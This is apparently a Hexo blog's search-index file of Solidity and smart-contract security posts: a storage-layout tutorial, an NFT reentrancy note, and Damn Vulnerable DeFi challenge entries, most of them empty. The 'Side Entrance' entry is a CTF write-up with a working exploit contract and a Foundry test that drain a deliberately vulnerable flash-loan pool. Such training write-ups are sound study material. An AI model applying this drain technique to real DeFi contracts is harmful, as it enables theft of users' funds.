<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>About_Storage_layout</title>
      <link href="/2024/01/02/About-Storage-layout/"/>
      <url>/2024/01/02/About-Storage-layout/</url>
      
        <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><hr><blockquote><p>Variables are declared as either storage, memory or calldata to explicity specify the location of the data     –solidity-by-example</p></blockquote><ul><li><code>storage</code> - variable is a state variable (store on blockchain))</li><li><code>memory</code> - variable is in memory and it exists while a function is being called</li><li><code>calldata</code> - special data location that contains function arguments</li></ul><h2 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h2><hr><p>State variables of contracts are stored in storage in a compact way. Sometimes multiple values may use the same storage slot. Except for dynamically-sized arrays and mappings , data is stored contiguously item after item starting with the first state variable ,start from slot 0.</p><p>According to the following rules:</p><ul><li>The first item in a storage slot is stored lower-order aligned.</li><li>Value types use only as many bytes as are necessary to store them.</li><li>If a value type does not fit the remaining part of a storage slot, it is stored in the next storage slot.</li><li>Structs and array data always start a new slot and their items are packed tightly according to these rules.</li><li>Items following struct or array data always start a new storage slot.</li></ul><h2 id="Mapping-and-Dynamic-Arrays"><a href="#Mapping-and-Dynamic-Arrays" class="headerlink" title="Mapping and Dynamic Arrays"></a>Mapping and Dynamic Arrays</h2><hr><p>Due to their unpredictable size, mappings and dynamically-sized array types cannot be stored “in between” the state variables preceding and following them. Instead, they are considered to occupy only 32 bytes with regards to the rules above and the elements they contain are stored starting at a different storage slot that is computed using a Keccak-256 hash.</p><h3 id="Dynamic-Variables"><a href="#Dynamic-Variables" class="headerlink" title="Dynamic Variables"></a>Dynamic Variables</h3><p>The object itself does take up a storage slot, but it doesn’t contain the whole array. Instead, the storage slot contains the length of the array.</p><p>If we add a new element to the array by calling <code>Array.push(123)</code>, the array’s length and the new element are stored at separate locations determined by the hash function</p><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><p>For mapping it’s has a slot , but it is empty it’s blank</p><h2 id="Temporary-Variables-Function-Scope"><a href="#Temporary-Variables-Function-Scope" class="headerlink" title="Temporary Variables: Function Scope"></a>Temporary Variables: Function Scope</h2><hr><p>For variables that are declared inside a function, their existence is ephemeral and scoped merely to the span of that function. These variables do not persist inside the contract and are not stored in <code>Storage</code>. Instead, they’re stashed in a different memory data structure, which deletes them as soon as the function has finished execution.<br>e.g:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Contract&#123;</span><br><span class="line">    function test(uint val) public &#123;</span><br><span class="line">        uint nVar = val + 5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nVar</code> only exists for the duration of <code>test()</code>.</p><h2 id="Memory-Keyword-Necessary-for-Strings"><a href="#Memory-Keyword-Necessary-for-Strings" class="headerlink" title="Memory Keyword: Necessary for Strings"></a>Memory Keyword: Necessary for Strings</h2><p>Finally, the <code>memory</code> keyword. Primarily used with strings, <code>memory</code> is needed because strings are dynamically sized arrays. By using this keyword, we tell Solidity that string operations are to be performed not in <code>Storage</code>, but in a separate memory location.</p><p>Solidity needs this explicit instruction because arrays and mappings require more space, hence the need to ensure that space is allocated in the appropriate data structure.<br>Here’s a code snippet using <code>memory</code> keyword with string:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract exampleContract&#123;</span><br><span class="line">    function getString() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;this is a string!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Constant-immutable"><a href="#Constant-immutable" class="headerlink" title="Constant &amp; immutable"></a>Constant &amp; immutable</h2><hr><p>The Solidity dont store constant or immutable variables in storage instead the vaues will replaced in every occurrence of these variables with their assigned value in the contract’s bytecode.</p><h2 id="Each-Variables-size-Example"><a href="#Each-Variables-size-Example" class="headerlink" title="Each Variables size(Example):"></a>Each Variables size(Example):</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Contract MyContract &#123;</span><br><span class="line">  uint256 zero;                          // in slot 0</span><br><span class="line">  mapping(address =&gt; uint256) one;    // in slot 1</span><br><span class="line">  address two;                          // in slot 2 </span><br><span class="line">  bool a;                              // in slot 3 - 1 byte</span><br><span class="line">  uint8 b;                             // in slot 3 - 1 byte </span><br><span class="line">  bytes16 c;                           // in slot 3 - 16 bytes</span><br><span class="line">  address immutable noWhere;           // Do not stored on storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Use-Foundry"><a href="#Use-Foundry" class="headerlink" title="Use Foundry"></a>Use Foundry</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge inspect contract_name storage</span><br></pre></td></tr></table></figure><p><img src="/../images/storageimg.png"></p><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html">https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Solidity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solidity </tag>
            
            <tag> Basic </tag>
            
            <tag> Storage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-10</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-10/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-10/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-9</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-9/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-9/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-8</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-8/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-7</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-7/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-7/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-6</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-6/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-6/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-5</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-5/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-4</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-4/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.</span><br><span class="line"></span><br><span class="line">It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</span><br><span class="line"></span><br><span class="line">Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        </span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>The contract realize a lender pool , and have a free flashloan, one interface.</p><p>There are there function:<code>deposit()</code>,<code>withdraw()</code>,<code>flashloan()</code>.</p><p>The Vuln is in flashloan function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external &#123;</span><br><span class="line">uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">if (address(this).balance &lt; balanceBefore) revert RepayFailed();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>especially<code>if (address(this).balance &lt; balanceBefore) revert RepayFailed();</code><br>it only check the contract.balance !!! </p><p>so if we use flashloan first , then we deposit it to the contract . The balanceof(pool) didn’t change . we Pass the check !!!</p><p>after all , we can call withdraw() to make balanace become zero.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p><code>Exp.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;./SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = SideEntranceLenderPool(_pool);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        payable(owner).transfer(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external payable &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        uint256 value = msg.value;</span><br><span class="line">        // deposit</span><br><span class="line">        pool.deposit&#123;value: value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOwner() public view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Attack.t.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/forge-std/src/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/4-side-entrance/Attacker.sol&quot;;</span><br><span class="line">import &quot;../../src/4-side-entrance/SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SideTest is Test &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    Exp exp;</span><br><span class="line">    address attacker;</span><br><span class="line">    uint256 internal constant INITIAL_Value = 1000e18;</span><br><span class="line">    uint256 internal constant INITIAL_HACKER_BALANCE = 1e18;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        pool = new SideEntranceLenderPool();</span><br><span class="line">        vm.deal(address(pool), INITIAL_Value);</span><br><span class="line">        vm.deal(attacker, INITIAL_HACKER_BALANCE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testValue() public &#123;</span><br><span class="line">        console.log(&quot;pool balance: &quot;, address(pool).balance);</span><br><span class="line">        console.log(&quot;attacker balance: &quot;, address(attacker).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testOwner() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        exp = new Exp(address(pool));</span><br><span class="line">        address owner = exp.getOwner();</span><br><span class="line">        assertEq(address(owner), address(attacker));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttacke() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        exp = new Exp(address(pool));</span><br><span class="line">        exp.attack(1000e18);</span><br><span class="line">        exp.withdraw();</span><br><span class="line">        assertEq(address(pool).balance, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/ray-so-export.png"></p>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
            <tag> DamnVulnerableDefi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-3</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-3/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RTTA-1:AttackNFT</title>
      <link href="/2023/12/28/RTTA-1-AttackNFT/"/>
      <url>/2023/12/28/RTTA-1-AttackNFT/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>ERC721<br>ER155</p><h1 id="Common-Issues"><a href="#Common-Issues" class="headerlink" title="Common Issues"></a>Common Issues</h1><hr><h2 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h2><p>普通的重入攻击，攻击者通过合约漏洞循环调用合约，将合约中的资产转走或者铸造大量代币。转账NFT的时候不会触发合约的fallback或者receive函数，那为什么有重入风险。</p><p>因为在NFT标准中ERC721&#x2F;ERC1155,为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 <code>ERC721</code> 的 <code>safeTransferFrom()</code> 函数会调用目标地址的 <code>onERC721Received()</code> 函数，而黑客可以把恶意代码嵌入其中进行攻击。</p><p>危险函数</p><table><thead><tr><th>–</th><th>Function</th><th>External Function</th></tr></thead><tbody><tr><td>ERC721</td><td>safeTransferFrom</td><td>onERC721Received</td></tr><tr><td>ERC721</td><td><code>_safeMint</code></td><td>onERC721Received</td></tr><tr><td>ERC1155</td><td>safeTransferFrom</td><td>onERC1155Received</td></tr><tr><td>ERC1155</td><td><code>_safeBatchTransferFrom</code></td><td>onERC1155Received</td></tr><tr><td>ERC1155</td><td><code>_mint</code></td><td>onERC1155Received</td></tr></tbody></table><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><ol><li>检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的<code>mint()</code>函数:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function mint() payable external &#123;</span><br><span class="line">// 检查是否mint过</span><br><span class="line">require(mintedAddress[msg.sender] == false);</span><br><span class="line">// 增加total supply</span><br><span class="line">totalSupply++;</span><br><span class="line">// 记录mint过的地址</span><br><span class="line">mintedAddress[msg.sender] = true;</span><br><span class="line">// mint</span><br><span class="line">_safeMint(msg.sender, totalSupply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Logic-issues特权用户抢跑"><a href="#Logic-issues特权用户抢跑" class="headerlink" title="Logic issues特权用户抢跑"></a>Logic issues特权用户抢跑</h2><h2 id="NFT-Market-Issues"><a href="#NFT-Market-Issues" class="headerlink" title="NFT Market Issues"></a>NFT Market Issues</h2><ul><li><strong>Signature verification</strong></li></ul><h2 id="Audit-Example"><a href="#Audit-Example" class="headerlink" title="Audit Example"></a>Audit Example</h2><hr><p><a href="https://0xvolodya.hashnode.dev/nft-attacks">https://0xvolodya.hashnode.dev/nft-attacks</a></p><h2 id="Audit-Guidelines"><a href="#Audit-Guidelines" class="headerlink" title="Audit Guidelines"></a>Audit Guidelines</h2><p><a href="https://blog.quillaudits.com/2023/03/07/nft-marketplace-smart-contract-audit-guidelines/">https://blog.quillaudits.com/2023/03/07/nft-marketplace-smart-contract-audit-guidelines/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Solidity </tag>
            
            <tag> NFT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About FuzzingTest</title>
      <link href="/2023/12/28/About-FuzzingTest/"/>
      <url>/2023/12/28/About-FuzzingTest/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blockchain </tag>
            
            <tag> Foundry </tag>
            
            <tag> FuzzTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-2</title>
      <link href="/2023/12/28/DamnVulnerableDeFi-2/"/>
      <url>/2023/12/28/DamnVulnerableDeFi-2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-1</title>
      <link href="/2023/12/28/DamnVulnerableDeFi-1/"/>
      <url>/2023/12/28/DamnVulnerableDeFi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h1>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
            <tag> FlashLoan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Defi-StableCoin</title>
      <link href="/2023/12/28/Defi-StableCoin/"/>
      <url>/2023/12/28/Defi-StableCoin/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/12/26/hello-world/"/>
      <url>/2023/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
